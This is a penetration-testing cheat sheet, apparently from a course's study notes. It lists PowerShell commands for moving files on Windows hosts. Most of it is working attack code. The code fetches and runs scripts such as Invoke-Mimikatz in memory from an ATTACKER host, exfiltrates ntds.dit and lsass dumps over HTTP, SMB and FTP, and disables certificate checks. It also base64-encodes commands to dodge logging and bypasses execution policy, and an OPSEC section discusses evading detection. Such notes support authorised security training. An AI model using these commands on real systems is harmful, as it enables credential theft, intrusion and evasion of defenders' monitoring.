# PowerShell File Transfers

**Tags:** `#powershell` `#filetransfer` `#windows` `#download` `#upload` `#exfil` `#lolbin`

Windows-native PowerShell download and upload methods. No external tools required — everything runs with built-in .NET classes. Essential for Windows file transfer when certutil is blocked or you need more flexibility. Covers download cradles for tools, in-memory execution, and exfiltration back to Kali.

**Source:** Built into Windows (`powershell.exe` — Windows PowerShell 5.1 on every modern host; `pwsh` = PowerShell 7+ only if separately installed)
**Kali HTTP server:** `python3 -m http.server 8080` (see [[Tools/File Transfer/python-http-server|python-http-server]])

> [!warning] **Know your shell — 5.1 vs 7+.** The default Windows shell is **Windows PowerShell 5.1**, which behaves differently from PowerShell 7 (`pwsh`). Several convenience flags below (`-SkipCertificateCheck`) exist **only in 7+** and error out in 5.1; over HTTPS, 5.1 also defaults to old TLS. Assume you're in 5.1 unless you've confirmed otherwise (`$PSVersionTable.PSVersion`).

---

## Download — WebClient (Most Compatible)

Works on PowerShell 2.0+ (Windows 7 / Server 2008+).

```powershell
# DownloadFile — write to disk
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/tool.exe', 'C:\Windows\Temp\tool.exe')

# DownloadFile — shorter alias
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('http://ATTACKER/tool.exe', 'C:\Windows\Temp\tool.exe')

# DownloadString — in-memory execution (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')

# Bypass self-signed / untrusted cert errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object Net.WebClient).DownloadFile('https://ATTACKER/tool.exe', 'C:\Temp\tool.exe')

# Force TLS 1.2 — REQUIRED on Win7/2008/2012 (.NET defaults to TLS 1.0 there,
# so HTTPS to a modern server fails with "Could not create SSL/TLS secure channel")
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
(New-Object Net.WebClient).DownloadFile('https://ATTACKER/tool.exe', 'C:\Temp\tool.exe')
```

---

## Download — Invoke-WebRequest (PowerShell 3.0+)

```powershell
# Basic download
Invoke-WebRequest -Uri 'http://ATTACKER/tool.exe' -OutFile 'C:\Windows\Temp\tool.exe'

# Short alias
iwr http://ATTACKER/tool.exe -OutFile C:\Windows\Temp\tool.exe

# Skip SSL check — PowerShell 7+ ONLY. In 5.1 this errors ("parameter cannot be found");
# use the ServicePointManager callback from the WebClient section instead.
iwr https://ATTACKER/tool.exe -OutFile C:\Temp\tool.exe -SkipCertificateCheck

# With headers
iwr http://ATTACKER/tool.exe -OutFile C:\Temp\tool.exe -Headers @{"Authorization"="Bearer TOKEN"}

# UseBasicParsing — REQUIRED in 5.1 when run as SYSTEM / fresh profile (no IE engine
# configured), otherwise iwr hangs or throws. Harmless (deprecated no-op) in 7+.
iwr http://ATTACKER/tool.exe -OutFile C:\Temp\tool.exe -UseBasicParsing
```

> [!tip] **Speed: kill the progress bar.** In Windows PowerShell 5.1, `Invoke-WebRequest -OutFile` renders a byte-by-byte progress bar that makes large transfers **10–50× slower**. Set `$ProgressPreference = 'SilentlyContinue'` first — a multi-MB tool that crawls for minutes then completes in seconds. `WebClient.DownloadFile` doesn't have this problem, so it's the better choice for big files on 5.1.

---

## In-Memory Execution (Fileless)

```powershell
# Download and execute PS1 — no disk write
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')

# IEX via Invoke-Expression alias
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')

# IEX via iwr
IEX (iwr http://ATTACKER/script.ps1 -UseBasicParsing)

# Pipe to IEX via string concat (basic AMSI bypass attempt)
$c = (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
IEX $c

# Load .NET assembly into memory (works for a managed EXE/DLL, not a native binary)
$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER/tool.exe')
$asm = [System.Reflection.Assembly]::Load($bytes)
# Load() alone only maps it — you still have to invoke the entry point to run it:
$asm.EntryPoint.Invoke($null, (,[string[]]@('arg1','arg2')))   # Main(string[] args)
# $asm.EntryPoint.Invoke($null, $null)                          # Main() with no args
```

---

## Download — BITS (Background Intelligent Transfer Service)

Slower but more stealthy — uses the Windows update mechanism.

```powershell
# BitsTransfer (PowerShell module — available by default)
Start-BitsTransfer -Source 'http://ATTACKER/tool.exe' -Destination 'C:\Temp\tool.exe'

# Asynchronous transfer
Start-BitsTransfer -Source 'http://ATTACKER/tool.exe' -Destination 'C:\Temp\tool.exe' -Asynchronous

# Via bitsadmin (cmd)
bitsadmin /transfer job /download /priority high http://ATTACKER/tool.exe C:\Temp\tool.exe
```

---

## Upload / Exfiltration

```powershell
# POST file to Kali receiver
$wc = New-Object Net.WebClient
$wc.UploadFile('http://ATTACKER:8000/upload', 'C:\Windows\NTDS\ntds.dit')

# POST data (base64-encoded for binary-safe exfil)
$bytes = [System.IO.File]::ReadAllBytes('C:\Windows\Temp\lsass.dmp')
$b64 = [Convert]::ToBase64String($bytes)
(New-Object Net.WebClient).UploadString('http://ATTACKER:8000/recv', $b64)

# Exfil via POST with Invoke-RestMethod
$data = Get-Content C:\Windows\System32\drivers\etc\hosts -Raw
Invoke-RestMethod -Uri 'http://ATTACKER:8000/recv' -Method POST -Body $data

# Exfil to SMB share
Copy-Item C:\sensitive\file.txt \\ATTACKER\share\file.txt

# Exfil via FTP
$ftp = [System.Net.FtpWebRequest]::Create("ftp://ATTACKER/file.txt")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = New-Object System.Net.NetworkCredential("user","pass")
$content = [System.IO.File]::ReadAllBytes("C:\file.txt")
$ftp.ContentLength = $content.Length
$stream = $ftp.GetRequestStream()
$stream.Write($content, 0, $content.Length)
$stream.Close()
```

---

## Proxy / Pivot

```powershell
# Download through proxy
$wc = New-Object Net.WebClient
$wc.Proxy = New-Object Net.WebProxy('http://proxy:8080', $true)
$wc.DownloadFile('http://ATTACKER/tool.exe', 'C:\Temp\tool.exe')

# Use system proxy settings
$wc = New-Object Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.DownloadFile('http://ATTACKER/tool.exe', 'C:\Temp\tool.exe')
```

---

## Encoding / Obfuscation (Bypass Logging)

```powershell
# Base64-encoded command (bypass ScriptBlock logging in some configs)
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $encoded

# Encode on Kali
echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")' | \
  iconv -f ASCII -t UTF-16LE | base64 -w0
```

---

## Execution Policy Bypass

```powershell
# Bypass execution policy when running scripts
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# Set for current process only
Set-ExecutionPolicy Bypass -Scope Process -Force
```

---

## OPSEC Notes

- `IEX` + `DownloadString` is one of the most-signatured PowerShell patterns — AMSI intercepts this on patched systems
- PowerShell Script Block Logging (Event ID **4104**) captures the full decoded script content
- `DownloadFile` to disk triggers Windows Defender on-access scan
- BITS transfers blend with Windows Update traffic — lower detection rate
- `-EncodedCommand` is itself flagged by many detections — encoding helps with logging, not AMSI

---

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] (CPTS v2) for the full transfer workflow and Kali/Linux side. LOLBin alternatives when PowerShell is restricted: [[Tools/File Transfer/certutil|certutil]], [[Tools/File Transfer/SMBserver|impacket-smbserver]]. Serve the files from [[Tools/File Transfer/python-http-server|python-http-server]].

---

*Created: 2026-03-06*
*Updated: 2026-08-28*
*Model: claude-opus-5*
